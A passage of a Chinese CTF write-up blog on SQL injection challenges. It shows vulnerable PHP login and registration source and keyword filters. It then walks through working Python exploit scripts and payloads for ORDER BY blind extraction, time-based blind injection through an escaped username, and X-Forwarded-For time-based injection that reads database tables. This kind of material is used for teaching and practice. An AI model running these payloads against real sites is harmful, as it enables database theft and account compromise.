punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select pwd from user where uname = '$username' limit 1"</span><span class="token punctuation">;</span>            <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"login"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:/user_main.php?order=id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>reg.html（略）</p><p>reg.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>        <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Could not connect: '</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$email</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\{|\}\]|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\{|\}|\]|\;|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$email</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO user (uname, pwd, email,nname) VALUES ('$username', '$password', '$email','$nickname')"</span><span class="token punctuation">;</span>            <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"login"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>         <span class="token punctuation">}</span>        <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>user_main.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token doctype">&lt;!doctype html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>CTFshow_web<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>css<span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"login"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Could not connect: '</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$order</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\{|\}|\[|\]|\;|\:|\'|\’|\“|\"|\&lt;|\>|\?|\,|\.|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from user order by $order"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select * from user order by id"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>   <span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><p>可以看到可传入的值都经过了严格的过滤，大多数特殊符号都被过滤，所以直接进行sql注入显然不可能，寻找其他的入手点，可以看到在<code>user_main.php</code>的传入的<code>order</code>值处，有一条<code>order by</code>语句，是用来根据<code>order by</code>后面的列来进行排序的，根据题目提示<code>flag_is_my_password</code>，所以我们只需要得到用户<code>flag</code>的密码即可，于是我们可以根据<code>pwd</code>的值来排序，然后配合盲注得出<code>flag</code>，我们注册不同密码的账号，原理假设密码为<code>e</code>（前端有个<code>md5</code>加密抓包可以直接绕过不影响），如果<code>flag</code>的密码为<code>flag{xxxxx}</code>那么<code>e</code>&lt;<code>flag{xxxxx}</code>，再传入<code>user_main.php?order=pwd</code>，那么密码为<code>e</code>的这一行就在flag这一行的上面。而如果注册一个密码为<code>g</code>的用户，则密码为<code>g</code>的用户的这一行则会在<code>flag</code>这一行的下面，于是就可以拿来进行盲注比较得出<code>flag</code>的所有值</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://b51823a7-b1c0-499d-878a-8a5b296655d3.chall.ctf.show"</span>urlreg <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/reg.php"</span>  <span class="token comment" spellcheck="true">#注册 必须要是可传参php文件</span>urllogin <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/login.php"</span>  <span class="token comment" spellcheck="true">#登录 必须要是可传参php文件</span>urlorder <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/user_main.php?order=pwd"</span>  <span class="token comment" spellcheck="true"># 显示</span>s <span class="token operator">=</span> <span class="token string">"-.0123456789:abcdefghijklmnopqrstuvwxyz{|}~"</span>  <span class="token comment" spellcheck="true"># 按照ascii码表的字符串大小排序</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>        exp <span class="token operator">=</span> <span class="token string">""</span>        exp <span class="token operator">=</span> flag <span class="token operator">+</span> j        datereg <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>exp<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 仔细观察username和password并没有对-和{}进行过滤</span>            <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"zzz"</span><span class="token punctuation">,</span>            <span class="token string">"nickname"</span><span class="token punctuation">:</span><span class="token string">"zzz"</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span>exp        <span class="token punctuation">}</span>        datelogin <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>exp<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span>exp        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>exp <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 当注册的用户名字为flag的时候，因为已经存在flag用户在，额直接打印flag跳过后面的语句的执行</span>            flag <span class="token operator">=</span> <span class="token string">'flag'</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 保持会话</span>        reg <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>urlreg<span class="token punctuation">,</span> datereg<span class="token punctuation">)</span>        login <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>urllogin<span class="token punctuation">,</span> datelogin<span class="token punctuation">)</span>        a <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlorder<span class="token punctuation">)</span>        txt <span class="token operator">=</span> a<span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token punctuation">(</span>txt<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"&lt;td>"</span><span class="token operator">+</span>exp<span class="token operator">+</span><span class="token string">"&lt;/td>"</span><span class="token punctuation">)</span><span class="token operator">></span>txt<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"&lt;td>flag@ctf.show&lt;/td>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># index返回字符串被找到到最小的索引（最左）</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 得到的字符为比flag的单个字符的值大1，所以需要-1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>最终得到到flag</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210354938.png" alt="" loading="lazy"></p><p><strong>F12</strong>可以看到<strong>hint</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210443551.png" alt="" loading="lazy"></p><p>可以看到这里需要username匹配admin，随后才可以输入密码，先在<strong>password</strong>处<strong>fuzz</strong>一下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210743129.png" alt="" loading="lazy"></p><p>过滤了单引号，如果password中要用单引号闭合的话显然很难这里就需要从username入手，详情可以参考上面的<code>BJDCTF-2nd—简单注入</code>，和p神和Smi1e师傅的文章：</p><ul><li><a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">[小密圈]经典写配置漏洞与几种变形学习</a></li><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">经典写配置漏洞与几种变形</a></li></ul><p>这里直接给出payload：<code>username=admin%0a\&amp;password=/**/or/**/if(left((password),1)REGEXP/**/binary/**/&quot;I&quot;,sleep(3),1)#</code></p><p>exp如下：</p><pre class=" language-php"><code class="language-php">import requestsurl <span class="token operator">=</span> "https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//bbafd3a8-7f89-4adf-84c2-7028b93775cc.chall.ctf.show/"</span>header <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token punctuation">:</span> "text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment" spellcheck="true">/*;q=0.8",    "Content-Type": "application/x-www-form-urlencoded"}str1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'passwd = ''for i in range(1, 40):    for j in str1:        exp = passwd + j        payload = '/**/</span><span class="token keyword">or</span><span class="token comment" spellcheck="true">/**/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">left</span><span class="token punctuation">(</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token constant">REGEXP</span><span class="token comment" spellcheck="true">/**/</span>binary<span class="token comment" spellcheck="true">/**/</span><span class="token string">"^{}"</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token shell-comment comment">#'.format(i, exp)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin%0a\\'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> payload        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span><span class="token function">total_seconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>            passwd <span class="token operator">=</span> passwd <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>这里需要注意以下几点：</p><ul><li><code>binary</code>匹配大小写</li><li><code>mid</code>和<code>substr</code>被过滤了用<code>left</code></li><li>空格用<code>/**/</code></li></ul><p>随后就可以跑出密码登录即可得到<code>flag</code></p><h3 id="XCTF—INSERT-INTO注入"><a href="#XCTF—INSERT-INTO注入" class="headerlink" title="XCTF—INSERT INTO注入"></a>XCTF—INSERT INTO注入</h3><p><strong>解题核心</strong>—————–substr(),x-forwarded-for头注入</p><p>平台：[bugku INSERT INTO注入](<a href="https://ctf.bugku.com/challenges#INSERT" target="_blank" rel="noopener">https://ctf.bugku.com/challenges#INSERT</a> INTO注入)题目链接：<a href="http://123.206.87.240:8002/web15/" target="_blank" rel="noopener">http://123.206.87.240:8002/web15/</a></p><p>在题目的下方给了源码：</p><pre class=" language-php"><code class="language-php">flag格式：flag<span class="token punctuation">{</span>xxxxxxxxxxxx<span class="token punctuation">}</span>不如写个Python吧<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ip_arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$ip_arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$db</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$connect</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to select database"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'your ip is :'</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"insert into client_ip (ip) values ('$ip')"</span><span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>通过观察代码可以发现变量<code>$ip</code>可以通过更改<code>X-Forwarded-For</code>头进行更改，且后面的代码把每一次查询的ip都插入的数据库，推测<code>$ip</code>处存在注入点，于是burp抓包判断注入点：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/OZAFpjoRIb1Wyig.png" style="zoom: 50%;" / loading="lazy"><p>利用延时注入验证此处确实存在注入点，于是开始构造注入函数，代码<code>$ip_arr = explode(&#39;,&#39;, $ip);</code>通过逗号将ip分离开，只取第一个，所以这里相当于过过滤了逗号注入符号，于是我们通常用的<code>mid</code>、<code>substr</code>，<code>if</code>判断在这里用不了了，在这里用以下注入方法替换：</p><p><code>if(sql,num,str)</code>可替换成<code>case when sql then sleep(5) else 1 end</code></p><p><code>sql</code>注入语句中的<code>substr</code>语句可以写成：<code>substr(sql from num for 1) = str</code>，将语句中的逗号替换成了<code>from</code>和<code>for</code>，语句照常进行，<code>mid</code>函数也可以这样</p><p>Payload1：<code>127.0.0.1&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>client_ip</code>,<code>flag</code></p><p>Payload2：<code>127.0.0.1&#39;and (case when (substr((select group_concat(column_name) from information_schema.columns where table_schema=&#39;flag&#39;) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>flag</code>中的<code>flag</code>列</p><p>Payload3：<code>127.0.0.1&#39;and (case when (substr((select group_concat(flag) from flag) from {} for 1 )=&#39;{}&#39;) then sleep(3) else 1 end )) #</code>，得到<code>flag</code>列中的<code>flag</code></p><p>python脚本如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsstr <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.-"</span>url 